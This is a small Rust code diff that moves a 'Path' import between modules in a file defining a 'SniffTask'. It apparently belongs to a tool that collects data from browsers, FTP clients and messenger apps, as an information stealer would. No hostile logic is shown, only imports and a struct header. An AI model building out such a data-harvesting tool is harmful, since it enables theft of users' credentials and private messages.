@@ -16,11 +16,11 @@ use crate::userinfo::UserInfoTask;
 use alloc::vec;
 use browsers::BrowsersTask;
 use collector::Collector;
+use filesystem::path::Path;
 use filesystem::FileSystem;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, CompositeTask, Task};
-use utils::path::Path;
 
 pub struct SniffTask<C: Collector, F: FileSystem> {
     inner: CompositeTask<C, F>,
